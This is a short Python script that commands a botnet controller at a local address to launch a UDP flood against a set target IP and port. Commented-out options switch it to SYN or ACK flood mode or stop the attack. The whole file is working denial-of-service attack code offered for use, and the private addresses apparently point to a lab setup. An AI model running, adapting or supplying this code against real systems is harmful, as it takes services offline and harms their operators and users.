import requests

# IP that you want to attack
IP = '192.168.200.52'
# Port that you want to attack
port = 80

# ---------------------------tcp_attack -----------------------------
# -------mode-------
# S: SYN Flood
# A: ACK Flood
# ------------------
# Uncomment these to start tcp attack--------------------------------
# mode = 'A'
# my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port, 'mode':mode}
# -------------------------------------------------------------------

# ---------------------------udp_attack------------------------------
my_data = {'attack':'udp_attack', 'IP':IP, 'port':port}
# -------------------------------------------------------------------

# Botnet URL
url = 'http://192.168.200.55:9999/'

# start attak
start_url = url + 'start'
r = requests.post(start_url, data=my_data)

# stop attack
# stop_url = url + 'stop'
# r = requests.get(stop_url)
